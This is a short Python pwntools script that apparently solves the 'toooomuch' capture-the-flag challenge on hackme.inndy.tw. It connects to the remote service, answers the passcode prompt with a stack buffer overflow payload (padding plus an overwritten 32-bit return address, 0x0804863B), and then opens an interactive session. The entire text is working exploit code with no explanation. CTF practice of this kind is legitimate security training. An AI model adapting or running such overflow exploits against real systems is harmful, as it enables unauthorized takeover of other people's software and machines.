from pwn import *

#p = process('./toooomuch')
p = remote('hackme.inndy.tw',7702)

p.recvuntil('passcode: ')
payload = 'a'*0x18 + 'aaaa'
payload += p32(0x0804863B)
p.sendline(payload)

p.interactive()